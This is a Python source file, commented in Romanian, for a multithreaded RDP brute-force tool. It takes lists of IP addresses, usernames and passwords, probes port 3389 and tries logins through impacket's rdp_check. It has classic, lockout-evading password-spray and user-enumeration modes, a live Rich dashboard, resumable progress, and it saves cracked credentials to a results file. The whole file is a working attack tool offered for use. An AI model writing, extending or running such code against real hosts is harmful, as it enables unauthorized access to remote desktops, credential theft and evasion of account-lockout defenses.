import os
import subprocess
import threading
import queue
import time
import itertools
import sys
import json
import termios
import tty
from collections import deque, defaultdict
import argparse
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.style import Style
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# Constante
PROGRESS_FILE = 'output/progress.txt'
DEFAULT_TIMEOUT = 8
DEFAULT_THREADS = 32
DEFAULT_CHUNK_SIZE = 10000

console = Console()

def is_port_open(ip, port, timeout):
    """Verifică dacă portul este deschis"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def try_rdp_login(ip, user, pwd, timeout):
    """Încearcă autentificarea RDP"""
    try:
        cmd = [
            'python3', '-m', 'impacket.examples.rdp_check',
            f'{user}:{pwd}@{ip}',
            '-timeout', str(timeout)
        ]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout+2)
        out = proc.stdout.decode(errors='ignore') + proc.stderr.decode(errors='ignore')
        
        if 'RDP protocol supported' in out or 'RDP authentication succeeded' in out or 'Authentication OK' in out:
            return 'OK'
        elif 'timed out' in out or 'timeout' in out:
            return 'TIMEOUT'
        elif 'connection reset' in out.lower():
            return 'CONN_RESET'
        elif 'NLA required' in out or 'CredSSP' in out:
            return 'NLA_REQUIRED'
        else:
            return 'FAIL'
            
    except subprocess.TimeoutExpired:
        return 'TIMEOUT'
    except Exception as e:
        if 'Connection reset' in str(e):
            return 'CONN_RESET'
        return f'ERROR: {str(e)}'

class BruteForceStats:
    """Clasă pentru gestionarea statisticilor brute force"""
    def __init__(self):
        self.start_time = time.time()
        self.tries = 0
        self.found = 0
        self.errors = 0
        self.port_open = 0
        self.port_closed = 0
        self.success_rate = 0
        self.current_ip = None
        self.current_user = None
        self.current_pwd = None
        self.log = deque(maxlen=5)  # Mini-log cu ultimele 5 rezultate
        
    def update(self, **kwargs):
        """Actualizează statisticile"""
        for key, value in kwargs.items():
            if hasattr(self, key):
                if isinstance(value, (int, float)):
                    setattr(self, key, getattr(self, key) + value)
                else:
                    setattr(self, key, value)
                    
    def get_stats(self):
        """Returnează statisticile curente"""
        elapsed = time.time() - self.start_time
        rate = self.tries / elapsed if elapsed > 0 else 0
        
        return {
            "Tries": self.tries,
            "Found": self.found,
            "Errors": self.errors,
            "Port_Open": self.port_open,
            "Port_Closed": self.port_closed,
            "Success_Rate": f"{self.success_rate:.2f}%",
            "Rate": f"{rate:.1f}/s",
            "Elapsed": f"{elapsed:.1f}s",
            "Current": f"{self.current_ip} | {self.current_user}"
        }

CYBER_BANNER = r'''
[bold magenta]
╔════════════════════════════════════════════════════════════════════════════╗
║        ███ CONQUER RDP BRUTEFORCE DASHBOARD ███                         ║
╚════════════════════════════════════════════════════════════════════════════╝
[/bold magenta]
'''

INSTRUCTIONS = "[cyan][p][/cyan] pauză  [cyan][s][/cyan] stop+salvare  [cyan][q][/cyan] quit rapid"

def dashboard_thread(stats, total, current_chunk, chunk_size, stop_event):
    """Dashboard live cu Rich Layout dublu: stânga statistici, dreapta log, sus banner, jos instrucțiuni"""
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=4),
        Layout(name="body", ratio=1),
        Layout(name="footer", size=2)
    )
    layout["body"].split_row(
        Layout(name="stats", ratio=2),
        Layout(name="log", ratio=3)
    )
    with Live(layout, console=console, refresh_per_second=5, screen=True):
        while not stop_event.is_set():
            # Header
            layout["header"].update(Panel(Text.from_markup(CYBER_BANNER), style="bold magenta"))
            # Stats Table
            elapsed = time.time() - stats.start_time
            rate = stats.tries / elapsed if elapsed > 0 else 0
            eta = (total - stats.tries) / rate if rate > 0 else 0
            total_progress = (stats.tries / total) * 100
            stats_table = Table(title="[bold cyan]Statistici Brute-Force[/bold cyan]", expand=True)
            stats_table.add_column("Stat", style="bold")
            stats_table.add_column("Valoare", style="bold yellow")
            stats_table.add_row("Chunk", str(current_chunk + 1))
            stats_table.add_row("Progres", f"{stats.tries}/{total} ({total_progress:.1f}%)")
            stats_table.add_row("OK", str(stats.found))
            stats_table.add_row("Rate", f"{rate:.1f}/s")
            stats_table.add_row("ETA", f"{int(eta//60):02}:{int(eta%60):02}")
            stats_table.add_row("Errors", str(stats.errors))
            stats_table.add_row("Ports", f"{stats.port_open} open, {stats.port_closed} closed")
            stats_table.add_row("Success Rate", f"{stats.success_rate:.2f}%")
            stats_table.add_row("Current", f"{stats.current_ip or '-'} | {stats.current_user or '-'}")
            layout["body"]["stats"].update(Panel(stats_table, title="[bold green]STATISTICI[/bold green]", border_style="green"))
            # Log Table
            log_table = Table(title="[bold magenta]Log Live[/bold magenta]", expand=True, show_header=False)
            for entry in list(stats.log)[-10:]:
                log_table.add_row(entry)
            layout["body"]["log"].update(Panel(log_table, title="[bold yellow]ULTIMELE REZULTATE[/bold yellow]", border_style="magenta"))
            # Footer
            layout["footer"].update(Panel(Text.from_markup(INSTRUCTIONS), style="bold white"))
            time.sleep(0.2)

def load_lines(path):
    """Încarcă liniile dintr-un fișier, ignorând liniile goale și spațiile"""
    try:
        if os.path.exists(path):
            with open(path) as f:
                return [line.strip() for line in f if line.strip()]
        return []
    except Exception as e:
        console.print(f"[red][ERROR][/red] Nu s-a putut încărca fișierul {path}: {e}")
        return []

def brute_worker(ip, user, pwd, timeout, result_q, stats):
    """Worker pentru brute force"""
    try:
        # Verifică dacă portul este deschis
        if not is_port_open(ip, 3389, timeout):
            stats.port_closed += 1
            return
            
        stats.port_open += 1
        
        # Încearcă autentificarea
        result = try_rdp_login(ip, user, pwd, timeout)
        stats.tries += 1
        
        if result == 'OK':
            stats.found += 1
            stats.success_rate = (stats.found / stats.tries) * 100 if stats.tries > 0 else 0
            
        result_q.put((ip, user, pwd, result))
        
    except Exception as e:
        stats.errors += 1
        result_q.put((ip, user, pwd, f"Error: {str(e)}"))

def combo_generator(ips, users, passwords, start_index=0):
    """Generează combinații (ip, user, password) la nevoie, cu opțiune de resume de la un index"""
    try:
        total = len(ips) * len(users) * len(passwords)
        for idx, (ip, user, pwd) in enumerate(itertools.product(ips, users, passwords)):
            if idx < start_index:
                continue
            yield idx, ip, user, pwd
    except Exception as e:
        console.print(f"[red][ERROR][/red] Eroare la generarea combinațiilor: {e}")
        return

def print_dashboard_line(stats, ip_curent, user_curent, pwd_curent, open_ips, chunk_idx, chunk_size, total, ok, rate, eta, start_idx, user_pwd_count=None, user_pwd_total=None):
    """Printează o linie de dashboard cu statistici"""
    try:
        progress = (stats.tries+start_idx)/total
        percent = progress*100
        user_info = f"User: {user_curent}"
        if user_pwd_count is not None and user_pwd_total is not None:
            user_info += f" [{user_pwd_count}/{user_pwd_total}]"
            
        line = (
            f"[Chunk {chunk_idx}] Progres: {stats.tries+start_idx}/{total} ({percent:.2f}%) | "
            f"OK: {ok} | Rate: {rate:.1f}/s | ETA: {eta//60:02}:{eta%60:02} | "
            f"IP: {ip_curent} | {user_info}"
        )
        
        if open_ips:
            line += f" | Port OPEN: {', '.join(open_ips)}"
            
        print(line, end='\r', flush=True)
    except Exception as e:
        console.print(f"[red][ERROR][/red] Eroare la printarea dashboard-ului: {e}")

def brute_force_chunk(ips, users, passwords, timeout=8, threads=32, chunk_size=10000, start_index=0, total=0, global_start_time=None):
    """Brute force pe un chunk de combinații"""
    result_q = queue.Queue()
    stats = BruteForceStats()
    stop_event = threading.Event()
    
    # Start dashboard thread
    dash_thread = threading.Thread(
        target=dashboard_thread,
        args=(stats, total, start_index//chunk_size, chunk_size, stop_event),
        daemon=True
    )
    dash_thread.start()
    
    def worker(jobs):
        for idx, ip, user, pwd in jobs:
            if stop_event.is_set():
                break
            brute_worker(ip, user, pwd, timeout, result_q, stats)
            
    # Prepare chunk of jobs
    jobs = []
    for idx, ip, user, pwd in itertools.islice(combo_generator(ips, users, passwords, start_index), chunk_size):
        jobs.append((idx+start_index, ip, user, pwd))
        
    if not jobs:
        stop_event.set()
        dash_thread.join()
        return [], start_index
        
    # Split jobs among threads
    chunk_per_thread = max(1, len(jobs) // threads)
    threads_list = []
    for i in range(threads):
        t_jobs = jobs[i*chunk_per_thread:(i+1)*chunk_per_thread]
        if not t_jobs:
            continue
        t = threading.Thread(target=worker, args=(t_jobs,))
        t.daemon = True
        t.start()
        threads_list.append(t)
        
    # Wait for all threads
    for t in threads_list:
        t.join()
        
    # Stop dashboard and get results
    stop_event.set()
    dash_thread.join()
    
    results = []
    while not result_q.empty():
        results.append(result_q.get())
        
    return results, jobs[-1][0]+1 if jobs else start_index

def brute_force(ips, users, passwords, timeout=8, threads=32):
    """Brute force clasic fără chunking (pentru compatibilitate)"""
    result_q = queue.Queue()
    stats = BruteForceStats()
    jobs = []
    
    for ip in ips:
        for user in users:
            for pwd in passwords:
                jobs.append((ip, user, pwd))
                
    total = len(jobs)
    job_q = queue.Queue()
    for job in jobs:
        job_q.put(job)
        
    def worker():
        while True:
            try:
                ip, user, pwd = job_q.get_nowait()
            except queue.Empty:
                return
            brute_worker(ip, user, pwd, timeout, result_q, stats)
            job_q.task_done()
            
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads_list.append(t)
        
    job_q.join()
    
    results = []
    while not result_q.empty():
        results.append(result_q.get())
        
    os.makedirs('output', exist_ok=True)
    with open('output/rdp_results.txt', 'a') as f:
        for ip, user, pwd, status in results:
            if status == 'OK':
                f.write(f"{ip}:{user}:{pwd}\n")
                console.print(f"[green][OK][/green] {ip}:{user}/{pwd}")
                
    return results

def save_progress(index):
    """Salvează progresul curent"""
    try:
        os.makedirs('output', exist_ok=True)
        with open(PROGRESS_FILE, 'w') as f:
            f.write(f"{index}\n{time.time()}")
    except Exception as e:
        console.print(f"[bold red]Error saving progress: {str(e)}[/bold red]")

def load_progress():
    """Încarcă progresul salvat"""
    try:
        if not os.path.exists(PROGRESS_FILE):
            return 0
            
        with open(PROGRESS_FILE, 'r') as f:
            index = int(f.readline().strip())
            saved_time = float(f.readline().strip())
            
        # Verifică dacă progresul este prea vechi
        if time.time() - saved_time > 24 * 3600:  # 24 ore
            console.print("[bold yellow]Progresul salvat este mai vechi de 24 de ore.[/bold yellow]")
            if input("Vrei să-l folosești oricum? (y/n): ").lower() != 'y':
                return 0
                
        return index
        
    except Exception as e:
        console.print(f"[bold red]Error loading progress: {str(e)}[/bold red]")
        return 0

def live_control(state):
    """Thread pentru control live (pauză, stop, exit)"""
    console.print("\n[bold cyan]Control live activat:[/bold cyan]")
    console.print("  - [bold]p[/bold] = pauză/continuă")
    console.print("  - [bold]s[/bold] = stop + salvare progres")
    console.print("  - [bold]q[/bold] = exit rapid")
    
    while not state['done']:
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
            if ch == 'p':
                state['paused'] = not state['paused']
                console.print("\n[yellow][PAUZĂ][/yellow]" if state['paused'] else "\n[green][CONTINUĂ][/green]")
            elif ch == 's':
                state['stop'] = True
                console.print("\n[yellow][STOP + SALVARE][/yellow]")
            elif ch == 'q':
                state['exit'] = True
                console.print("\n[red][EXIT RAPID][/red]")
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

def interactive_menu_full():
    """Meniu interactiv pentru selectarea modului și parametrilor"""
    console.print("\n[bold cyan]===== MENIU RDP BRUTEFORCE =====[/bold cyan]")
    
    mode_opts = [
        ("Spray brute-force (anti-lockout, recomandat)", 'spray'),
        ("Classic brute-force (toate combinațiile)", 'classic'),
        ("Enumerare useri (doar test useri existenți)", 'enum'),
    ]
    
    console.print("\n[bold]Alege modul:[/bold]")
    for i, (desc, _) in enumerate(mode_opts):
        console.print(f"  {i+1}. {desc}")
        
    while True:
        try:
            midx = input(f"\nMod [1-{len(mode_opts)}] (default 1): ")
            mode = mode_opts[int(midx)-1][1] if midx.strip() else 'spray'
            break
        except (ValueError, IndexError):
            console.print("[red]Opțiune invalidă![/red]")
            
    thread_opts = [4, 8, 16, 32, 64]
    console.print("\n[bold]Alege număr thread-uri:[/bold]")
    for i, v in enumerate(thread_opts):
        console.print(f"  {i+1}. {v}")
        
    while True:
        try:
            tidx = input(f"\nThread-uri [1-{len(thread_opts)}] (default 3): ")
            threads = thread_opts[int(tidx)-1] if tidx.strip() else 16
            break
        except (ValueError, IndexError):
            console.print("[red]Opțiune invalidă![/red]")
            
    chunk_size = None
    if mode in ['classic', 'spray']:
        chunk_opts = [1000, 10000, 100000]
        console.print("\n[bold]Alege chunk size:[/bold]")
        for i, v in enumerate(chunk_opts):
            console.print(f"  {i+1}. {v}")
            
        while True:
            try:
                cidx = input(f"\nChunk size [1-{len(chunk_opts)}] (default 2): ")
                chunk_size = chunk_opts[int(cidx)-1] if cidx.strip() else 10000
                break
            except (ValueError, IndexError):
                console.print("[red]Opțiune invalidă![/red]")
                
    console.print(f"\n[bold]Setări:[/bold]")
    console.print(f"  - Mod: {mode}")
    console.print(f"  - Thread-uri: {threads}")
    console.print(f"  - Chunk size: {chunk_size if chunk_size else '-'}")
    
    input("\nApasă Enter pentru a începe...")
    return mode, threads, chunk_size

def enumerate_users(ips, users, timeout, threads):
    """Enumerare utilizatori RDP"""
    try:
        result_q = queue.Queue()
        stats = BruteForceStats()
        total = len(ips) * len(users)
        stop_event = threading.Event()
        
        # Start dashboard thread
        dash_thread = threading.Thread(
            target=dashboard_thread,
            args=(stats, total, 0, len(users), stop_event),
            daemon=True
        )
        dash_thread.start()
        
        def worker():
            while not stop_event.is_set():
                try:
                    ip, user = job_q.get_nowait()
                except queue.Empty:
                    return
                    
                try:
                    # Verifică dacă portul este deschis
                    if not is_port_open(ip, 3389, timeout):
                        stats.port_closed += 1
                        job_q.task_done()
                        continue
                        
                    stats.port_open += 1
                    
                    # Încearcă autentificarea cu parolă falsă
                    result = try_rdp_login(ip, user, "FakePassword123!", timeout)
                    stats.tries += 1
                    
                    if result == 'OK':
                        stats.found += 1
                    elif result == 'NLA_REQUIRED':
                        stats.errors += 1
                        
                    result_q.put((ip, user, result))
                    
                except Exception as e:
                    stats.errors += 1
                    result_q.put((ip, user, f"Error: {str(e)}"))
                    
                job_q.task_done()
                
        # Creează job-urile
        job_q = queue.Queue()
        for ip in ips:
            for user in users:
                job_q.put((ip, user))
                
        # Start worker threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Așteaptă finalizarea
        job_q.join()
        stop_event.set()
        dash_thread.join()
        
        # Colectează rezultatele
        results = []
        while not result_q.empty():
            results.append(result_q.get())
            
        # Salvează rezultatele
        os.makedirs('output', exist_ok=True)
        with open('output/rdp_users.txt', 'w') as f:
            for ip, user, status in results:
                if status == 'OK':
                    f.write(f"{ip}:{user}\n")
                    console.print(f"[green][OK][/green] {ip}:{user}")
                    
        console.print(f"\n[bold green]Enumerare completă. Utilizatori găsiți: {stats.found}[/bold green]")
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operațiune întreruptă de utilizator[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]")

def brute_force_spray_chunked(ips, users, passwords, timeout=8, threads=32, chunk_size=10000, start_index=0):
    """Brute force spray cu chunking (evită lockout)"""
    try:
        print(f"[DEBUG] brute_force_spray_chunked: {len(ips)} IP-uri, {len(users)} useri, {len(passwords)} parole, chunk_size={chunk_size}, start_index={start_index}")
        result_q = queue.Queue()
        stats = BruteForceStats()
        total = len(ips) * len(users) * len(passwords)
        stop_event = threading.Event()
        
        # Start dashboard thread (forțat mereu)
        dash_thread = threading.Thread(
            target=dashboard_thread,
            args=(stats, total, start_index//chunk_size, chunk_size, stop_event),
            daemon=True
        )
        dash_thread.start()
        print("[DEBUG] Dashboard thread started!")
        
        def worker():
            while not stop_event.is_set():
                try:
                    ip, user, pwd = job_q.get_nowait()
                except queue.Empty:
                    return
                stats.current_ip = ip
                stats.current_user = user
                print(f"[DEBUG] Worker: {ip} {user} {pwd}")
                try:
                    # Verifică dacă portul este deschis
                    if not is_port_open(ip, 3389, timeout):
                        stats.port_closed += 1
                        job_q.task_done()
                        continue
                    stats.port_open += 1
                    # Încearcă autentificarea
                    result = try_rdp_login(ip, user, pwd, timeout)
                    stats.tries += 1
                    if result == 'OK':
                        stats.found += 1
                        stats.success_rate = (stats.found / stats.tries) * 100 if stats.tries > 0 else 0
                        stats.log.append(f"[green][OK][/green] {ip}:{user}/{pwd}")
                    else:
                        stats.log.append(f"[red][FAIL][/red] {ip}:{user}/{pwd}")
                    result_q.put((ip, user, pwd, result))
                except Exception as e:
                    stats.errors += 1
                    stats.log.append(f"[red][ERROR][/red] {ip}:{user}/{pwd} {str(e)}")
                    result_q.put((ip, user, pwd, f"Error: {str(e)}"))
                job_q.task_done()
        
        # Procesează fiecare chunk
        for chunk_idx in range(start_index//chunk_size, max(1, (total + chunk_size - 1)//chunk_size)):
            if stop_event.is_set():
                break
            start = chunk_idx * chunk_size
            end = min(start + chunk_size, total)
            job_q = queue.Queue()
            for i in range(start, end):
                ip_idx = (i // (len(users) * len(passwords))) % len(ips)
                user_idx = (i // len(passwords)) % len(users)
                pwd_idx = i % len(passwords)
                ip = ips[ip_idx]
                user = users[user_idx]
                pwd = passwords[pwd_idx]
                job_q.put((ip, user, pwd))
            threads_list = []
            for _ in range(max(1, threads)):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads_list.append(t)
            job_q.join()
            results = []
            while not result_q.empty():
                results.append(result_q.get())
            os.makedirs('output', exist_ok=True)
            with open('output/rdp_results.txt', 'a') as f:
                for ip, user, pwd, status in results:
                    if status == 'OK':
                        f.write(f"{ip}:{user}:{pwd}\n")
                        console.print(f"[green][OK][/green] {ip}:{user}/{pwd}")
            save_progress(end)
        stop_event.set()
        dash_thread.join()
        if os.path.exists(PROGRESS_FILE):
            os.remove(PROGRESS_FILE)
        console.print(f"\n[bold green]Brute-force spray complet. Succese: {stats.found}[/bold green]")
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operațiune întreruptă de utilizator[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]")

def brute_force_classic_chunked(ips, users, passwords, timeout=8, threads=32, chunk_size=10000, start_index=0):
    """Brute force clasic cu chunking (toate combinațiile)"""
    try:
        print(f"[DEBUG] brute_force_classic_chunked: {len(ips)} IP-uri, {len(users)} useri, {len(passwords)} parole, chunk_size={chunk_size}, start_index={start_index}")
        result_q = queue.Queue()
        stats = BruteForceStats()
        total = len(ips) * len(users) * len(passwords)
        stop_event = threading.Event()
        dash_thread = threading.Thread(
            target=dashboard_thread,
            args=(stats, total, start_index//chunk_size, chunk_size, stop_event),
            daemon=True
        )
        dash_thread.start()
        print("[DEBUG] Dashboard thread started!")
        def worker():
            while not stop_event.is_set():
                try:
                    ip, user, pwd = job_q.get_nowait()
                except queue.Empty:
                    return
                stats.current_ip = ip
                stats.current_user = user
                print(f"[DEBUG] Worker: {ip} {user} {pwd}")
                try:
                    if not is_port_open(ip, 3389, timeout):
                        stats.port_closed += 1
                        job_q.task_done()
                        continue
                    stats.port_open += 1
                    result = try_rdp_login(ip, user, pwd, timeout)
                    stats.tries += 1
                    if result == 'OK':
                        stats.found += 1
                        stats.success_rate = (stats.found / stats.tries) * 100 if stats.tries > 0 else 0
                        stats.log.append(f"[green][OK][/green] {ip}:{user}/{pwd}")
                    else:
                        stats.log.append(f"[red][FAIL][/red] {ip}:{user}/{pwd}")
                    result_q.put((ip, user, pwd, result))
                except Exception as e:
                    stats.errors += 1
                    stats.log.append(f"[red][ERROR][/red] {ip}:{user}/{pwd} {str(e)}")
                    result_q.put((ip, user, pwd, f"Error: {str(e)}"))
                job_q.task_done()
        for chunk_idx in range(start_index//chunk_size, max(1, (total + chunk_size - 1)//chunk_size)):
            if stop_event.is_set():
                break
            start = chunk_idx * chunk_size
            end = min(start + chunk_size, total)
            job_q = queue.Queue()
            for i in range(start, end):
                ip_idx = i // (len(users) * len(passwords))
                user_idx = (i // len(passwords)) % len(users)
                pwd_idx = i % len(passwords)
                if ip_idx >= len(ips):
                    break
                ip = ips[ip_idx]
                user = users[user_idx]
                pwd = passwords[pwd_idx]
                job_q.put((ip, user, pwd))
            threads_list = []
            for _ in range(max(1, threads)):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads_list.append(t)
            job_q.join()
            results = []
            while not result_q.empty():
                results.append(result_q.get())
            os.makedirs('output', exist_ok=True)
            with open('output/rdp_results.txt', 'a') as f:
                for ip, user, pwd, status in results:
                    if status == 'OK':
                        f.write(f"{ip}:{user}:{pwd}\n")
                        console.print(f"[green][OK][/green] {ip}:{user}/{pwd}")
            save_progress(end)
        stop_event.set()
        dash_thread.join()
        if os.path.exists(PROGRESS_FILE):
            os.remove(PROGRESS_FILE)
        console.print(f"\n[bold green]Brute-force clasic complet. Succese: {stats.found}[/bold green]")
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operațiune întreruptă de utilizator[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]")

def detect_nla(ip, user, password, timeout=8):
    """Detectează dacă NLA este activat pe un IP"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        rdp_check_path = os.path.join(script_dir, 'impacket', 'examples', 'rdp_check.py')
        
        cmd = [
            'python3', rdp_check_path,
            f'{user}:{password}@{ip}',
            '-timeout', str(timeout)
        ]
        
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout+2)
        out = proc.stdout.decode(errors='ignore') + proc.stderr.decode(errors='ignore')
        
        if 'NLA required' in out or 'CredSSP' in out:
            return True  # NLA activat
        if 'RDP protocol supported' in out or 'Authentication failed' in out or 'access denied' in out:
            return False  # NLA dezactivat
        if 'connection reset by peer' in out or 'wrong version number' in out or 'unpack requires a buffer' in out:
            return 'skip'  # Ignora aceste IP-uri
            
    except subprocess.TimeoutExpired:
        return 'skip'  # Timeout = skip
    except Exception as e:
        if 'Connection reset' in str(e):
            return 'skip'  # Connection reset = skip
        return None  # Necunoscut
        
    return None  # Necunoscut

def main():
    """Funcția principală"""
    try:
        # Încarcă fișierele de input
        ips = load_lines('input/ips.txt')
        users = load_lines('input/users.txt')
        passwords = load_lines('input/passwords.txt')
        
        if not ips or not users or not passwords:
            console.print("[bold red]Error: Input files are empty or missing[/bold red]")
            return
        
        # Afișează meniul
        console.print("\n[bold cyan]RDP Brute Force Tool[/bold cyan]")
        console.print("1. Brute Force Classic (toate combinațiile)")
        console.print("2. Brute Force Spray (evită lockout)")
        console.print("3. User Enumeration")
        
        choice = input("\nSelectează modul (1-3): ")
        
        # Setează parametrii
        threads = int(input("Număr de thread-uri (default 32): ") or "32")
        chunk_size = int(input("Mărime chunk (default 10000): ") or "10000")
        timeout = int(input("Timeout în secunde (default 8): ") or "8")
        
        # Verifică dacă există combinații valide
        if choice == "1" or choice == "2":
            total_combos = len(ips) * len(users) * len(passwords)
            if total_combos == 0:
                console.print("[bold red]Nu există combinații valide de IP-uri, useri și parole![/bold red]")
                return
        elif choice == "3":
            total_combos = len(ips) * len(users)
            if total_combos == 0:
                console.print("[bold red]Nu există combinații valide de IP-uri și useri pentru enumerare![/bold red]")
                return
        
        # Mesaj de așteptare înainte de dashboard
        console.print("\n[bold green]Pornesc brute-force, dashboard-ul va apărea imediat...[/bold green]")
        
        # Verifică dacă există progres salvat
        start_index = 0
        if os.path.exists(PROGRESS_FILE):
            start_index = load_progress()
            if start_index is None:
                return
        
        # Rulează modul selectat
        if choice == "1":
            brute_force_classic_chunked(ips, users, passwords, timeout, threads, chunk_size, start_index)
        elif choice == "2":
            brute_force_spray_chunked(ips, users, passwords, timeout, threads, chunk_size, start_index)
        elif choice == "3":
            enumerate_users(ips, users, timeout, threads)
        else:
            console.print("[bold red]Opțiune invalidă[/bold red]")
        
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operațiune întreruptă de utilizator[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {str(e)}[/bold red]")
    finally:
        if os.path.exists(PROGRESS_FILE):
            os.remove(PROGRESS_FILE)

if __name__ == "__main__":
    main() 